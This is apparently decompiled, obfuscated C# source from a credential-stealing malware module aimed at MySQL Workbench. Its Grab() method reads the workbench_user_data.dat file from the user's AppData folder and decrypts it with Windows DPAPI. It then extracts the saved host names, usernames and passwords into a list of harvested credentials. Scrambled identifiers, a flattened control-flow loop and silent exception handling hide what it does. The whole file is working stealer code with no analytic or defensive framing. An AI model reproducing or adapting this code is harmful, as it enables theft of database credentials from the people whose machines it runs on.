using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using SNt;
using p3N5Y;

namespace ZAZUx;

public class _1bizLmVpkrG : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string FZWii3vU
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public _1bizLmVpkrG()
	{
		FZWii3vU = "MysqlWorkbench";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string path = default;
		List<ii68> list = default;
		do
		{
			if (num == 2)
			{
				path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\MySQL\\Workbench\\workbench_user_data.dat";
				num = 3;
			}
			if (num == 4)
			{
				return list;
			}
			if (num == 3)
			{
				if (File.Exists(path))
				{
					break;
				}
				num = 4;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
		try
		{
			string text = ctLlKJA7.Lbl(File.ReadAllBytes(path), (DataProtectionScope)0);
			string[] array = text.Split(new char[1] { '\n' });
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					if (text2.Length > 1)
					{
						string text3 = Regex.Split(text2, Convert.ToString('\u0002'))[0];
						string input = text2.Replace(text3, "").Trim(new char[1] { '\u0002' });
						text3 = text3.Split(new char[1] { '@' })[1];
						string username = Regex.Split(input, Convert.ToString('\u0003'))[0];
						string password = Regex.Split(input, Convert.ToString('\u0003'))[1];
						ii68 ii69 = new ii68();
						ii69.byIdLuuGZbL = text3;
						ii69.S8v = username;
						ii69._9H5rP7hg2 = password;
						ii69.oVAe = FZWii3vU;
						list.Add(ii69);
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
